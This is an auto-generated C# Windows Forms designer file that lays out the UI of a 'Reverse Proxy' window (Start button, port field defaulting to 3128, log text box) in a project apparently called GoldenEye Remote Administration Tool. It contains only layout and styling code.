namespace GoldenEye_Remote_Administration_Tool.Forms
{
    partial class Reverse_Proxy
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.velyseForm1 = new VelyseTheme.VelyseForm();
            this.t_Label1 = new MonoFlat.t_Label();
            this.velyseNumericButton1 = new VelyseTheme.VelyseNumericButton();
            this.button1 = new MonoFlat.Button();
            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
            this.velyseForm1.SuspendLayout();
            this.SuspendLayout();
            // 
            // velyseForm1
            // 
            this.velyseForm1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(33)))), ((int)(((byte)(35)))));
            this.velyseForm1.BaseColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(33)))), ((int)(((byte)(35)))));
            this.velyseForm1.Controls.Add(this.t_Label1);
            this.velyseForm1.Controls.Add(this.velyseNumericButton1);
            this.velyseForm1.Controls.Add(this.button1);
            this.velyseForm1.Controls.Add(this.richTextBox1);
            this.velyseForm1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.velyseForm1.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.velyseForm1.Location = new System.Drawing.Point(0, 0);
            this.velyseForm1.Name = "velyseForm1";
            this.velyseForm1.Padding = new System.Windows.Forms.Padding(10, 70, 10, 9);
            this.velyseForm1.RoundCorners = VelyseTheme.VelyseForm.VLRoundCorner.Round;
            this.velyseForm1.Sizable = true;
            this.velyseForm1.Size = new System.Drawing.Size(800, 450);
            this.velyseForm1.SmartBounds = true;
            this.velyseForm1.StartPosition = System.Windows.Forms.FormStartPosition.WindowsDefaultLocation;
            this.velyseForm1.TabIndex = 0;
            this.velyseForm1.Text = "Reverse Proxy";
            this.velyseForm1.Text_Font = new System.Drawing.Font("Segoe UI", 12F);
            this.velyseForm1.TextColor = System.Drawing.Color.White;
            this.velyseForm1.TopColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(79)))), ((int)(((byte)(124)))));
            this.velyseForm1.Click += new System.EventHandler(this.velyseForm1_Click);
            // 
            // t_Label1
            // 
            this.t_Label1.AutoSize = true;
            this.t_Label1.BackColor = System.Drawing.Color.Transparent;
            this.t_Label1.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.t_Label1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(116)))), ((int)(((byte)(125)))), ((int)(((byte)(132)))));
            this.t_Label1.Location = new System.Drawing.Point(165, 83);
            this.t_Label1.Name = "t_Label1";
            this.t_Label1.Size = new System.Drawing.Size(32, 15);
            this.t_Label1.TabIndex = 3;
            this.t_Label1.Text = "Port:";
            // 
            // velyseNumericButton1
            // 
            this.velyseNumericButton1._Theme = VelyseTheme.VelyseNumericButton._ThemeChoose.Light;
            this.velyseNumericButton1.AddSubTextColor = System.Drawing.Color.Gray;
            this.velyseNumericButton1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(49)))));
            this.velyseNumericButton1.BaseColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(49)))));
            this.velyseNumericButton1.ButtonColor = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(79)))), ((int)(((byte)(124)))));
            this.velyseNumericButton1.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.velyseNumericButton1.ForeColor = System.Drawing.Color.Gray;
            this.velyseNumericButton1.Location = new System.Drawing.Point(203, 75);
            this.velyseNumericButton1.Maximum = ((long)(9999999));
            this.velyseNumericButton1.Minimum = ((long)(0));
            this.velyseNumericButton1.Name = "velyseNumericButton1";
            this.velyseNumericButton1.Size = new System.Drawing.Size(75, 30);
            this.velyseNumericButton1.TabIndex = 2;
            this.velyseNumericButton1.Text = "velyseNumericButton1";
            this.velyseNumericButton1.Value = ((long)(3128));
            this.velyseNumericButton1.ValueTextColor = System.Drawing.Color.FromArgb(((int)(((byte)(150)))), ((int)(((byte)(150)))), ((int)(((byte)(150)))));
            // 
            // button1
            // 
            this.button1.BackColor = System.Drawing.Color.Transparent;
            this.button1.BG = System.Drawing.Color.FromArgb(((int)(((byte)(49)))), ((int)(((byte)(79)))), ((int)(((byte)(124)))));
            this.button1.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.button1.Image = null;
            this.button1.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.button1.Location = new System.Drawing.Point(13, 66);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(146, 41);
            this.button1.TabIndex = 1;
            this.button1.Text = "Start";
            this.button1.TextAlignment = System.Drawing.StringAlignment.Center;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // richTextBox1
            // 
            this.richTextBox1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(33)))), ((int)(((byte)(35)))));
            this.richTextBox1.Location = new System.Drawing.Point(0, 113);
            this.richTextBox1.Name = "richTextBox1";
            this.richTextBox1.Size = new System.Drawing.Size(800, 337);
            this.richTextBox1.TabIndex = 0;
            this.richTextBox1.Text = "";
            // 
            // Reverse_Proxy
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(800, 450);
            this.Controls.Add(this.velyseForm1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "Reverse_Proxy";
            this.Text = "Reverse Proxy";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.velyseForm1.ResumeLayout(false);
            this.velyseForm1.PerformLayout();
            this.ResumeLayout(false);

        }

        #endregion

        private VelyseTheme.VelyseForm velyseForm1;
        private MonoFlat.Button button1;
        private System.Windows.Forms.RichTextBox richTextBox1;
        private MonoFlat.t_Label t_Label1;
        private VelyseTheme.VelyseNumericButton velyseNumericButton1;
    }
}